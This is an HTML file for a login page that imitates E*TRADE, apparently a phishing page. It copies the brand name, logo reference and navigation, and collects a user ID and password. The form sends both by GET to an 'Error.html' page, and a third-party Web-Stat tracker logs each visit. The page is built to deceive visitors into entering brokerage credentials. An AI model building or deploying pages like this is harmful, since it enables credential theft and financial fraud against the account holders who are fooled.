<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="logo.png" type="image/x-icon">
  <title>Log On to ETRADE</title>
  
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #ffffff; /* Background color set to white */
      font-family: Arial, sans-serif;
      display: flex; /* Enable flexbox */
      flex-direction: column;
      min-height: 100vh;
    }

    header {
      display: flex;
      align-items: center;
      padding: 10px 20px;
      justify-content: flex-start;
      flex-wrap: wrap;
      background: #fff;
    }

    header img {
      width: 200px;
      height: auto; /* Maintain aspect ratio */
      margin-right: 20px;
    }

    .heading-words {
      display: flex;
      align-items: center;
      gap: 30px; /* Space between heading-type words */
      flex-wrap: wrap;
    }

    .heading-words h5 {
      margin: 0;
      font-size: 14px;
    }

    main {
      display: flex;
      flex: 1; /* Take up the remaining space */
      justify-content: center; /* Center horizontally */
      align-items: center; /* Center vertically */
    }

    .login-form {
      background: #ffffff;
      padding: 20px;
      border: 1px solid #ccc;
      border-radius: 5px;
      width: 300px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      text-align: left; /* Align form content to the left */
    }

    .login-form h2 {
      margin-bottom: 20px;
      font-size: 24px;
      text-align: center;
    }

    .login-form label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
    }

    .login-form input[type="text"],
    .login-form input[type="password"],
    .login-form select {
      width: 100%;
      padding: 8px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }

    .login-form .options {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 15px;
    }

    .login-form .options label {
      font-size: 12px;
    }

    .login-form button {
      width: 100%;
      padding: 10px;
      background-color: #6200ea;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }

    .login-form button:hover {
      background-color: #4500b5;
    }

    .login-form .links {
      text-align: center;
      margin-top: 15px;
    }

    .login-form .links a {
      text-decoration: none;
      font-size: 12px;
      color: #6200ea;
    }

    .login-form .links a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <img src="etrade-from-MS.png" alt="Logo"> <!-- Replace with the actual path to your logo image -->
    <div class="heading-words">
      <h5>Account Types</h5>
      <h5>Investment Choices</h5>
      <h5>New to Investing</h5>
      <h5>Trading</h5>
      <h5>Pricing and Rates</h5>
      <h5>Knowledge</h5>
    </div>
  </header>
  
  <main>
    <div class="login-form">
      <h2>Log on</h2>
      <form action="Error.html" method="GET"> <!-- Redirects to error.html on form submission -->
        <label for="user-id">User ID</label>
        <input type="text" id="user-id" name="user-id" required>
        
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
        
        <div class="options">
          <label><input type="checkbox" name="remember"> Remember User ID</label>
          <label><input type="checkbox" name="security-code"> Use security code</label>
        </div>
        
        <label for="go-to">Go To:</label>
        <select id="go-to" name="go-to">
          <option value="accounts">Accounts</option>
          <option value="investment">Investment Choices</option>
          <option value="new-investing">New to Investing</option>
          <option value="trading">Trading</option>
          <option value="pricing">Pricing and Rates</option>
          <option value="knowledge">Knowledge</option>
        </select>
        
        <button type="submit">Log on</button>
        
        <div class="links">
          <a href="#">Forgot User ID or Password?</a><br>
          <a href="#">Need more help logging on?</a>
        </div>
      </form>
    </div>
  </main>
  
  <!-- Begin Web-Stat code v 7.0 -->
<span id="wts2192617"></span>
<script>var wts=document.createElement('script');wts.async=true;
wts.src='https://app.ardalio.com/log7.js';document.head.appendChild(wts);
wts.onload = function(){ wtslog7(2192617,1); };
</script><noscript><a href="https://www.web-stat.com">
<img src="https://app.ardalio.com/7/1/2192617.png" 
alt="Web-Stat web traffic analysis"></a></noscript>
<!-- End Web-Stat code v 7.0 -->
  
  
  
  
  
</body>
</html>
